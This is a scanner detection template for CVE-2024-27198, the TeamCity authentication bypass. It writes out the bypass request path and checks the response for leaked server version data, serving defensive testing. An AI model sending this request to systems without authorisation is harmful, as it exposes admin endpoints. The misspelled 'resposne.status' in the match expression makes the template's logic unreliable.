id: CVE-2024-27198

info:
  name: TeamCity < 2023.11.4 - Authentication Bypass
  author: DhiyaneshDk
  severity: critical
  verified: true
  description: |
    In JetBrains TeamCity before 2023.11.4 authentication bypass allowing to perform admin actions was possible
    shodan: http.component:"TeamCity"
  reference:
    - https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/
    - https://nvd.nist.gov/vuln/detail/CVE-2024-27198
  tags: cve,cve2024,teamcity,jetbrains,auth-bypass
  created: 2024/03/07

rules:
  r0:
    request:
      method: GET
      path: /hax?jsp=/app/rest/server;.jsp
    expression: |
      resposne.status == 200 &&
      response.headers["content-type"].contains("text/html") &&
      response.body.bcontains(b"buildNumber") &&
      response.body.bcontains(b"server version") &&
      response.body.bcontains(b"internalId")
expression: r0()
